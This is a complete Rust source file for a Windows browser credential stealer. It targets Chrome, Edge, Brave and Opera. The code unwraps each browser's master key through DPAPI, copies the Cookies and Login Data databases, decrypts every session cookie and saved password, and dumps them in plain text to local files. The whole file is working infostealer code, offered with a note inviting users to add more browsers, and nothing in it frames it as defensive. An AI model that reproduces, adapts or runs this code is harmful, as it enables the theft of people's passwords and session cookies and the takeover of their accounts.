use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::{env, fs};

use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{Aead, KeyInit},
};
use base64::Engine;
use rusqlite::Connection;
use serde::Serialize;
use serde_json::Value;
use windows::Win32::Security::Cryptography::{CRYPT_INTEGER_BLOB, CryptUnprotectData};

struct Browser {
    name: &'static str,
    subpath: &'static str,
}

//Add more if u need

const BROWSERS: &[Browser] = &[
    Browser {
        name: "Chrome",
        subpath: "Google/Chrome/User Data",
    },
    Browser {
        name: "Edge",
        subpath: "Microsoft/Edge/User Data",
    },
    Browser {
        name: "Brave",
        subpath: "BraveSoftware/Brave-Browser/User Data",
    },
    Browser {
        name: "Opera",
        subpath: "Opera Software/Opera Stable",
    },
];

#[derive(Serialize)]
struct ProfileData {
    browser: String,
    profile: String,
    cookies: Vec<Cookie>,
    logins: Vec<Login>,
}

#[derive(Serialize)]
struct Cookie {
    host: String,
    name: String,
    value: String,
    path: String,
    expires_utc: i64,
    is_secure: bool,
    is_httponly: bool,
}

#[derive(Serialize)]
struct Login {
    url: String,
    username: String,
    password: String,
}

fn get_master_key(userdata: &Path) -> Option<Vec<u8>> {
    let local_sate = userdata.join("Local State");
    let raw_path = fs::read_to_string(&local_sate).ok()?;

    let json: Value = serde_json::from_str(&raw_path).ok()?;
    if let Some(b64) = json["os_crypt"]["encrypted_key"].as_str() {
        let mut key = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;

        if key.starts_with(b"DPAPI") {
            key.drain(..5);
            return dpapi_decrypt(&key);
        }
    }

    if json["os_crypt"]["app_bound_encrypted_key"].is_string() {
        println!("[!] app_bound_encrypted_key found — needs browser COM elevation to unwrap.")
    }

    None
}

fn dpapi_decrypt(enc: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: enc.len() as u32,
            pbData: enc.as_ptr() as *mut u8,
        };

        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).ok()?;

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();

        windows::Win32::Foundation::LocalFree(windows::Win32::Foundation::HLOCAL(
            output.pbData as *mut _,
        ));

        Some(result)
    }
}

fn find_profiles(userdata: &Path) -> Vec<(String, PathBuf)> {
    let mut profiles = Vec::new();
    let default_dir = userdata.join("Default");

    if default_dir.is_dir() {
        profiles.push(("Default".into(), default_dir));
    }

    if let Ok(entries) = fs::read_dir(userdata) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();

            if name.starts_with("Profile ") && entry.path().is_dir() {
                profiles.push((name.clone(), entry.path()));
            }
        }
    }

    profiles.sort_by(|a, b| a.0.cmp(&b.0));
    profiles
}

fn decrypt_blob(encrypted: &[u8], master_key: &[u8]) -> Option<String> {
    if encrypted.is_empty() {
        return Some(String::new());
    }

    if encrypted.len() > 15 && (encrypted.starts_with(b"v10") || encrypted.starts_with(b"v20")) {
        let nonce = Nonce::from_slice(&encrypted[3..15]);
        let ciphertext = &encrypted[15..];
        let cipher = Aes256Gcm::new_from_slice(master_key).ok()?;
        let plain = cipher.decrypt(nonce, ciphertext).ok()?;

        return String::from_utf8(plain).ok();
    }

    let plain = dpapi_decrypt(encrypted)?;
    String::from_utf8(plain).ok()
}

fn copy_db(profile_dir: &Path, db_name: &str) -> Option<PathBuf> {
    let candidates = [
        profile_dir.join("Network").join(db_name),
        profile_dir.join(db_name),
    ];

    for src in &candidates {
        if src.is_file() {
            let dst = env::temp_dir().join(format!("chromdec_{}_{}", std::process::id(), db_name));
            if fs::copy(src, &dst).is_ok() {
                return Some(dst);
            }
        }
    }
    None
}

fn extract_cookies(profile_dir: &Path, key: &[u8]) -> Vec<Cookie> {
    let db_path = match copy_db(profile_dir, "Cookies") {
        Some(p) => p,
        None => return Vec::new(),
    };

    let conn = match Connection::open(&db_path) {
        Ok(c) => c,
        Err(_) => {
            let _ = fs::remove_file(&db_path);
            return Vec::new();
        }
    };

    let mut out = Vec::new();

    let sql = "SELECT host_key, name, encrypted_value, path, expires_utc, \
               is_secure, is_httponly FROM cookies ORDER BY host_key, name";

    if let Ok(mut stmt) = conn.prepare(sql) {
        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, i64>(4)?,
                row.get::<_, bool>(5)?,
                row.get::<_, bool>(6)?,
            ))
        });

        if let Ok(rows) = rows {
            for row in rows.flatten() {
                let (host, name, enc, path, expires, secure, httponly) = row;
                let value = decrypt_blob(&enc, key).unwrap_or_default();
                out.push(Cookie {
                    host,
                    name,
                    value,
                    path,
                    expires_utc: expires,
                    is_secure: secure,
                    is_httponly: httponly,
                });
            }
        }
    }

    let _ = fs::remove_file(&db_path);
    out
}

fn extract_logins(profile_dir: &Path, key: &[u8]) -> Vec<Login> {
    let db_path = match copy_db(profile_dir, "Login Data") {
        Some(p) => p,
        None => return Vec::new(),
    };

    let conn = match Connection::open(&db_path) {
        Ok(c) => c,
        Err(_) => {
            let _ = fs::remove_file(&db_path);
            return Vec::new();
        }
    };

    let mut out = Vec::new();

    let sql = "SELECT origin_url, username_value, password_value FROM logins";

    if let Ok(mut stmt) = conn.prepare(sql) {
        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        });

        if let Ok(rows) = rows {
            for row in rows.flatten() {
                let (url, user, enc_pass) = row;
                let password = decrypt_blob(&enc_pass, key).unwrap_or_default();
                if !user.is_empty() || !password.is_empty() {
                    out.push(Login {
                        url,
                        username: user,
                        password,
                    });
                }
            }
        }
    }

    let _ = fs::remove_file(&db_path);
    out
}

fn write_data(data: &ProfileData, output_dir: &Path) {
    let dir = output_dir.join(&data.browser).join(&data.profile);
    fs::create_dir_all(&dir).expect("can't create output dir");

    if !data.cookies.is_empty() {
        let mut out = String::new();

        for c in &data.cookies {
            out.push_str(
                &format!(
                    "\nHost: {}\nName: {}\nValue: {}\nPath: {}\nIsSecure: {}\nHttpOnly: {}\nExpires: {}\n\n",
                    c.host, c.name, c.value, c.path, c.is_secure, c.is_httponly, c.expires_utc
                )
            );
        }

        fs::write(dir.join("cookies.txt"), out).expect("can't write cookies.txt");
    }
    if !data.logins.is_empty() {
        let json = serde_json::to_string_pretty(&data.logins).unwrap();

        fs::write(dir.join("passwords.json"), json).expect("can't write passwords.json");
    }
}

fn main() {
    let localappdata = env::var("LOCALAPPDATA").expect("Could not acces LOcalappdata.");
    let PB_LAD = PathBuf::from(localappdata);

    let output = PathBuf::from(".\\output");

    let targets: Vec<&Browser> = BROWSERS.iter().collect();
    let mut result: HashMap<String, Vec<ProfileData>> = HashMap::new();

    for browser in &targets {
        let userdata = PB_LAD.join(browser.subpath);
        if !userdata.is_dir() {
            continue;
        }

        println!("[*] {} - {}", browser.name, userdata.display());

        let master_key = match get_master_key(&userdata) {
            Some(k) => {
                println!(
                    "  [+] Key: {}",
                    k.iter().map(|b| format!("{:02x}", b)).collect::<String>()
                );

                k
            }
            None => {
                eprintln!("  [-] can't extract master key — skipping");
                continue;
            }
        };

        let profiles = find_profiles(&userdata);
        if profiles.is_empty() {
            eprintln!("  [-] no profiles found");
            continue;
        }

        for (profile_name, profile_dir) in &profiles {
            println!("  [+] {}", profile_name);

            let cookies = extract_cookies(profile_dir, &master_key);
            let logins = extract_logins(profile_dir, &master_key);

            println!("      {} cookies, {} logins", cookies.len(), logins.len());

            let data = ProfileData {
                browser: browser.name.to_string(),
                profile: profile_name.clone(),
                cookies,
                logins,
            };

            write_data(&data, &output);
            result
                .entry(browser.name.to_string())
                .or_default()
                .push(data);
        }
    }
}
